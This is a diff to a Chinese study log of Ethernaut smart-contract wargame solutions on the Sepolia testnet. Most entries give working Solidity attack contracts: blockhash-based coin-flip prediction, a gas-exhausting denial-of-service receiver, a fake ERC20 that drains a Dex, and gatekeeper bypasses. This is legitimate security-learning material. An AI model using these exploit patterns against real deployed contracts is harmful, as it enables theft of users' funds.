@@ -18,6 +18,7 @@ timezone: Asia/Shanghai
 1. eth sepolia rpc: https://eth-sepolia.public.blastapi.io
 2. 现在测试网水龙头变得麻烦了，要求主网要有余额。
 水龙头：https://sepolia-faucet.pk910.de/#/
+       https://www.alchemy.com/faucets/ethereum-sepolia
 3. 测试1部署合约：0x480Ee5663698aA065B3c971722eda3e835ce024d
 4. 根据教程一步步执行，最后通过 authenticate 方法提交答案
 #### Ethernaut - Fallback
@@ -165,5 +166,250 @@ contract BuildingImpl is Building {
 Vault 的进阶版，需要通过web3js获取存储的数据，需要学习下evm中是如何存储数据的
 合约地址：0x57c70Fd38b1D9B453013EF0b6021B926EA131E6e
 
+### 2024.09.05
+#### Ethernaut - Shop
+可以实现一个动态的 被调用函数
+合约地址：0x2eafa118534F7B4652d7e7Ee5e2d6146d32E620e
+```
+contract BuyerImpl {
+    address public shopAddress;
+    
+    constructor() {}
+    
+    function setShopAddress(address _shopAddress) public  {
+        shopAddress = _shopAddress;
+    }
+
+    function payForShop(address _shopAddress) payable public {
+        Shop _shop = Shop(_shopAddress);
+        _shop.buy();
+    }
+
+    function price() external view returns (uint256) {
+        Shop _shop = Shop(shopAddress);
+        if (_shop.isSold()) {
+            return 1;
+        }
+        return 101;
+    }
+}
+```
+
+### 2024.09.06
+#### Ethernaut - Naught Coin
+单纯看合约没啥问题，不过合约继承了 ERC20 合约，该合约还有其它转账的方法，比如 TransferFrom
+可以用 TransferFrom 进行转账，不会走到 lockTokens 的逻辑
+
+### 2024.09.07
+#### Ethernaut - Recovery
+不是很懂这题要考察什么？考察如何提前计算合约地址？反正是从浏览器中找到了合约地址，调用了自毁方法，就通过了...
+
+### 2024.09.08
+#### Ethernaut - Dex
+这题的 getSwapPrice 方法有问题，会用交易前的价格执行整个交易，实际交易时会有滑点问题。
+只需要不断用一种资产换另一种资产，再用另一种资产换回原来资产这种方式，就能消耗完 Dex 中所有代表
+
+### 2024.09.09
+#### Ethernaut - DexTwo
+根据题目提示，能够发现 Dex 合约在进行swap时，没有判断交易的是否是题目创建的两个合约。
+我们能够构建一个有问题的合约，去把 Dex 创建的两个代币合约中的代币偷出来。
+实例地址：0xEd4F4dDf2D09A4c3b98bC8176970329a9cA4943E
+```
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+
+    function balanceOf(address account) public pure override  returns (uint256) {
+        return uint256(1);
+    }
+}
+```
+
+### 2024.09.10
+#### Ethernaut - Coin Flip
+可以部署一个合约，提前算出这个回合的值，然后再调用目标合约
+实例地址：0xC4942cA0C3cF779AE244026Bd5768a79bC93FA91
+```
+contract AttackCoinFlip {
+    CoinFlip flip;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _flip) {
+        flip = CoinFlip(_flip);
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        bool res = flip.flip(side);
+        if (!res) {
+            revert();
+        }
+    }
+}
+```
+### 2024.09.11
+#### Ethernaut - Denial
+题目专门提示了 gas 费不超过 1M。然后看下合约，通过 call 方法调用 partner。
+call 会默认调用partner的 receive方法，只需要目标合约的 receive 方法为死循环，就能让 withdraw 方法失效。
+实例地址：0x91c906F8d655A90601805B71745f454742c38632
+```
+contract AttackDenial {
+    receive() external payable {
+        for (uint256 i = 1; i<10000000000; i++) {
+            if (i == 100) {
+                i = 10;
+            }
+        }
+    }
+}
+```
+
+### 2024.09.12
+#### Ethernaut - Stake
+合约的目的，是 总余额大于 eth 余额，只要往里面质押 weth 就好了。但是我们并没有 weth，这时观察合约，可以发现 StakeWETH 方法没有检查 transferFrom 方法的返回值，因此只要有授权，转账失败也没关系。
+1. 使用另一个账号质押 eth
+2. 调用 weth 合约的 approve 方法增加授权
+3. 调用 StakeWETH 质押 weth，注意数额要比1大，实际并没有质押
+4. 调用 Unstake，将所有数量取出
+实例地址：0x8F4BDfE756B27102E891B9fC1F623c1c1138279C
+
+### 2024.09.13
+#### Ethernaut - Good Samaritan
+可以发现，Good Samaritan 会在 Wallet 抛出 NotEnoughBalance 错误时，把所有资产都转给调用者。同时 Wallet 底层的 Coin 会在转账时，调用对方的 notify 方法。我们只需要在 notify 中实现 抛出 NotEnoughBalance 错误就行。
+需要注意，为了防止 Good Samaritan 在将所有资产都转给调用合约时，也触发 notify 方法，需要结合 notify 的入参的进行判断。
+地址实例：0x4920eBb362bdBa68bfC548F34faaAa86A6C828D1
+```
+contract AttackGoodSamaritan is INotifyable {
+    error NotEnoughBalance();
+    
+    function notify(uint256 amount) external {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+
+    function requestDonation(address d) public  {
+        GoodSamaritan(d).requestDonation();
+    }
+}
+```
+
+
+### 2024.09.14
+#### Ethernaut - Gatekeeper Three
+满足题目的三个 modifier，就可以成为参赛者。
+实例地址：0x784872141affcfD443a6f43093Ed81B0BB6d6D04
+```
+contract AttackGatekeeperThree {
+    address public gateAddr;
+
+    constructor(address addr) {
+        gateAddr = addr;
+    }
+
+    error Error1();
+
+    function setConstruct0r() public {
+        GatekeeperThree(payable (gateAddr)).construct0r();
+    }
+
+    function getAllowance() public {
+        uint256 t = block.timestamp;
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+    }
+
+    function setEnter() public {
+        GatekeeperThree(payable (gateAddr)).enter();
+    }
+
+    receive() external payable {
+        revert Error1();
+    }
+}
+```
+
+### 2024.09.15
+#### Ethernaut - GateKeeper One
+要满足几个条件才能通过题目。
+分析条件一，对于uint64,需要高32位不为0，低16位和tx.origin的低16位相同，中间16位为0
+条件二，通过循环暴力做出来了。可以在调用 enter 时可以通过 gas 设置传递的 gas 费
+实例地址：0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93
+```
+contract AttackGatekeeperOne {
+    address public _gateAddr = 0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93;
+    event Log(uint256 i, uint256 gas);
+    bytes8 public gateKey2 = 0x000000010000a345;
+
+    constructor() {}
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function getGateThree() public view returns (bytes8) {
+        uint16 low16 = uint16(uint160(tx.origin));
+        uint32 low32 = uint32(low16);
+        uint64 _gateKey = (uint64(1) << 32) | uint64(low32);
+        return bytes8(_gateKey);
+    }
+
+    function checkGateKey(bytes8 _gateKey) public gateThree(_gateKey) view returns (bool) {
+        return true;
+    }
+
+    function getEnter(uint256 number) public  {
+        bool successed = false;
+        for (uint256 i = 500*number; i < 500*(number+1); i++) {
+            if (successed) break;
+            try GatekeeperOne(_gateAddr).enter{gas: 50000+i}(gateKey2) {
+                emit Log(i, gasleft());
+                successed = true;
+            } catch {
+            }
+        }
+        require(successed);
+    }
+}
+```
+
+### 2024.09.16
+#### Ethernaut - GateKeeper Two
+和 GateKeeper One 类似，需要过几个关卡
+关卡1: 要求使用合约来调用 enter 方法
+关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
+关卡3: 学习如何进行异步运算
+实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
+```
+contract AttackGatekeeperTwo {
+    constructor() {
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
+        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
+        GatekeeperTwo(gateAddr).enter(_gateKey);
+    }
+}
+```
 
 <!-- Content_END -->
